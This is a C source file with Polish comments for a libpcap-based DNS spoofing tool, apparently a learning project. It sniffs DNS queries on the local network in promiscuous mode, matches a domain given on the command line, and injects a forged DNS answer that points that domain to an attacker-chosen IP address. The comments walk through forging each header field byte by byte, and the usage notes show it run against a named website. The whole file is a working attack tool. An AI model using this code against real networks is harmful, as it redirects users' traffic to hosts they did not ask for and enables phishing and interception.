/*

    Kompilowac przez:
    gcc -Wall -Wextra -pedantic main.c -lpcap -o main

    Uruchamiac przez:
    sudo ./main <strona> <adres ip, na ktory przekierowujemy>

    Przklad uruchomienia:
    sudo ./main www.spaceadventure.pl 216.18.168.16

    Zabijac przez:
    <CTRL+C>
    
*/


#include <pcap.h>     //wszystko do oblugi pakietow
#include <stdio.h>    //wejscie/wyjscie
#include <string.h>   //strlen, strcmp, memcpy
//#include <stdlib.h>
//#include <errno.h>
//#include <sys/socket.h>
//#include <netinet/in.h>                         //Tutaj sa biblioteki, ktorych uzywaly programy, na ktorych sie wzorowalem, ale mi nie sa potrzebne
//#include <arpa/inet.h>                          //Ale w sumie zostawiam, bo moze ktos znajdzie w nich jakies inspiracje kiedys, jak bedzie potrzebowac
//#include <netinet/if_ether.h> 
//#include <net/ethernet.h>
//#include <netinet/ether.h> 
//#include <netinet/ip.h> 


pcap_t* descr;                //nasz uchwyt do wysylania/odbierania pakietow, cos jak FILE*
unsigned char url[100];       //tu wstawimy url (po lekkiej obrobce) od uzytkownika
unsigned char ip[4];          //tu wstawimy ip (jako hex) od uzytkownika

uint16_t inet_csum(const void *buf, size_t hdr_len) {   //funkcja liczaca sume kontrolna dla IP 
    unsigned long sum = 0;
    const uint16_t *ip1;

    ip1 = (const uint16_t *) buf;
    while (hdr_len > 1) {
        sum += *ip1++;
        if (sum & 0x80000000)
           sum = (sum & 0xFFFF) + (sum >> 16);
        hdr_len -= 2;
    }

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return(~sum);
}


void my_callback(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet){
    (void) args;      //zagluszenie warninga xDDD
  
    fprintf(stderr,"Captured %d bytes, Full length = %d bytes\n",pkthdr->caplen,pkthdr->len);   //wypisanie info o pakiecie: liczbe jego bajtow i dlugosc (?) oczekiwana
   /* for(unsigned int i=0; i<pkthdr->caplen; i++){
        fprintf(stderr,"%x ", *(packet+i));
    }   
    fprintf(stderr,"\n");
    const char* t= packet+54;
    for(int i=0; i<strlen(t); i++)
      fprintf(stderr, "%x ",t[i]);
    fprintf(stderr,"\n");*/
  
    if (!strcmp((char*)(packet+54),(char*)url)){            //na pozycji (packet+54) zaczyna sie dns query name, sprawdzamy go z tym podanym w parametrze programu
        unsigned char buffer[pkthdr->caplen+16];            //bufer, w ktorym stworzymy nasz pakiet na podstawie tego odebranego
        unsigned const char* p = packet;                    //iteracyjne wskazniki na dane: pakietu odebranego i buforu, w ktorym "zrobimy" sobie pakiet
        unsigned char* b=buffer;

        memcpy(b,p+6,6);                      //destination MAC (6 bajtow) - wkladamy source MAC z pakietu
        memcpy(b+6,p,6);                      //source MAC (6 bajtow) - wkladamy dest MAC z pakietu
        b+=12; p+=12;                         //podciagamy wskazniki
        unsigned char* ipPtr = b+2;           //pamietamy wskaznik na poczatek warstwy IP - potem bedziemy liczyc z niej sume kontrolna
        memcpy(b,p,8);                        //kopiujemy na zywca kolejne 8 bajtow: Ether Type (IPv4) = 2 bajty, ***POCZATEK WARSTWY IP**** Version = 4bity, Header Length = 4 bity, DiffServ = 1 bajt, Total length = 2 bajty, ID = 2 bajty
        b[5]+=16;                             //dodajemy 16 do pola Total Length (tyle bajtow zajmuje nasza odpowiedz DNS)
        b[6]+=1;                              //dodajemy 1 do ID, tak zeby nie byly takie same (to niekoniecznie cos zmienia)
        b+=8;
        b[0]=0x40;                            //nastepne 2 bajty to flagi: Reserved Bit = 1 bit, Don't Fragment = 1 bit (jego wlasnie zapalilismy), More Fragments = 1 bit
        b+=1; p+=9;
        memcpy(b,p,3);                        //dokopiowujemy pozostale bity z tych 2 bajtow, ktore reprezentuja "Fragment Offset" oraz Time To Live = 1 bajt i Protocol (UDP = 17) = 1 bajt
        b+=3; p+=3;
        unsigned char* check=b;               //pamietamy wskaznik na sume kontrolna IP = 2 bajty
        memcpy(b, "\0\0",2);                  //a na razie ustawiamy ja na 0 (jest to wazne przy wyliczaniu tejze sumy)
        b+=2;p+=2;
        memcpy(b,p+4,4);                      //source IP (4 bajty) - wkladamy destination IP z pakietu
        memcpy(b+4,p,4);                      //destination IP (4 bajty) - wkladamy source IP z pakietu
        b+=8;p+=8;
        uint16_t sum = inet_csum(ipPtr, 20);  //wyliczamy sume kontrolna warstwy IP - 20 bajtow od zapamietanego miejsca
        memcpy(check, &sum, 2);               //i wkladamy ja w zapamietane miejsce
        memcpy(b,p+2,2);                      //***POCZATEK WARSTWY UDP*** Source port = 2 bajty - wkladamy destination port z pakietu
        memcpy(b+2,p,2);                      //destination port = 2 bajty - wkladamy source port z pakietu
        b+=4;p+=4;
        memcpy(b,p,6);                        //kopiujemy kolejne 6 bajtow: Pozostala dlugosc pakietu = 2 bajty, suma kontrolna UDP = 2 bajty, ***POCZATEK WARSTWY DNS*** Transaction ID = 2 bajty
        b[1]+=16;                             //zwiekszamy Dlugosc o 16 (tak samo jak w IP - tyle dopiszemy w odpowiedzi)
        b[2]=0;                               //zerujemy sume kontrolna
        b[3]=0;                               //zerujemy sume kontrolna (podobno mozna ja zignorowac)
        b+=6; p+=6;
        b[0]=0x81;                            //nastepne 2 bajty to flagi UDP. Ustawiamy "Message is response", "Do query recursively" i "Server can do recursive queries"
        b[1]=0x80;
        b+=2;p+=2;
        memcpy(b,p,pkthdr->caplen-46);        //wklejamy reszte pakietu do naszego buforu: Questions (2 bajty), Answers (2 bajty), Authority RRS (2 bajty), Adittional RRS (2 bajty) i zapytanie DNS: Nazwa (zmienna dlugosc), Typ = 2 bajty (np. o adres IP, mail itp), Klasa = 2 bajty
        b[3]=1;                               //ustawiamy liczbe odpowiedzi na 1
        b+=pkthdr->caplen-46; p+=pkthdr->caplen-46;     //przesuwamy wskazniki
        memcpy(b,"\xc0\x0c\x00\x01\x00\x01\x00\x00\x2e\x54\x00\x04",12);    //doklejamy odpowiedz w postaci Nazwa = 2 bajty (0xc0 0x0c), Typ = 2 bajty (A, czyli adres IP, = 1 = "0x00 0x01"), Klasa = 2 bajty (IN = 1 = "0x00 0x01"), Time To Live = 4 bajty (cokolwiek, co serwer to rozna liczba),  Dlugosc danych = 2 bajty (adres IP ma dlugosc 4 = "0x00 0x04". Razem 12 bajtow
        b+=12;
        memcpy(b, ip, 4);     //na koniec wstawiamy 4 bajty adresu IP podanego jako parametr programu
        
      
        int bytes_written = pcap_inject(descr, buffer, pkthdr->caplen+16);      //wysylamy nasz pakiet z buffera o dlugosci rownej dlugosci starego pakietu + 16 bajtow dodane od nas
       
        fprintf(stderr,"sent %d bytes -> ",bytes_written);                    //patrzymy, co tam nasz program wyslal w swiat
        for(unsigned int i=0; i<pkthdr->caplen+16; i++){
            fprintf(stderr,"%x ", *(buffer+i));
        }

        fprintf(stderr,"\n");
        fprintf(stderr,".\n");
    }

}

void resolve_url(const char* s){          //zamiana url na format dns query name: string konczy sie \0, a na poczatku i zamiast kazdej kropki adresu ma liczbe znakow 'nastepnego wyrazu'
    int n=0;
    url[strlen(s)+1]=0;
    for(int i=strlen(s)-1; i>=0; i--){
        if(s[i]=='.'){
            url[i+1]=n;
            n=0;
        }else{
            url[i+1]=s[i];
            n++;
        }
    }
    url[0]=n;
}

void resolve_ip(const char* s){
    sscanf(s,"%hhu.%hhu.%hhu.%hhu",&ip[0],&ip[1],&ip[2],&ip[3]);       //wczytujemy 4 liczby oddzielone kropkami. %hhu = unsigned char
}

int main(int argc, char** argv){
    pcap_if_t *interfaces;      //lista interfejsow do uzycia (np. eth0, wlan0, wlp2s0)
    char *dev;                  //nasz interfejs
    char errbuf[PCAP_ERRBUF_SIZE];    //string na wiadomosc bledu
    struct bpf_program fp;      /* hold compiled program     */
    bpf_u_int32 maskp;          /* subnet mask               */
    bpf_u_int32 netp;           /* ip                        */
    const char* filter= "udp and dst port domain";
      
    if (argc<3){
        printf("program usage: %s <url> <ip>\n", argv[0]);
        return 1;
    }

    resolve_url(argv[1]);     
    resolve_ip(argv[2]);
  
   /* fprintf(stderr,"1\n");
    for(int i=0; i<strlen(url); i++)
        fprintf(stderr, "%x ",url[i]);
    fprintf(stderr,"\n");
    for(int i=0; i<4; i++)
        fprintf(stderr, "%hhd ", ip[i]);
    fprintf(stderr,"\n");*/
  
    
    /* grab a device to peak into... */
    if(pcap_findalldevs(&interfaces,errbuf)==-1)                                //znajdujemy wszystkie urzadzenia. W wiekszosci tutoriali ludzie uzywaja 'device = pcap_lookupdev(error_buffer);', ale to jest deprecated
    { fprintf(stderr,"Error in pcap findall devs %s\n",errbuf); return 1;}
    dev = interfaces->name;                                                     //wybieramy pierwsze = najlepsze xD

    /* ask pcap for the network address and mask of the device */
    pcap_lookupnet(dev,&netp,&maskp,errbuf);

    /* open device for reading. NOTE: defaulting to
     * promiscuous mode*/
    descr = pcap_open_live(dev,BUFSIZ,1,-1,errbuf);
    if(descr == NULL)
    { printf("pcap_open_live(): %s\n",errbuf); return 1; }


    /* Lets try and compile the program.. non-optimized */
    if(pcap_compile(descr,&fp,filter,0,netp) == -1)
    { fprintf(stderr,"Error calling pcap_compile\n"); return 1; }

    /* set the compiled program as the filter */
    if(pcap_setfilter(descr,&fp) == -1)
    { fprintf(stderr,"Error setting filter\n"); return 1; }

    /* ... and loop */ 
    pcap_loop(descr,-1,my_callback,NULL);

    return 0;
}

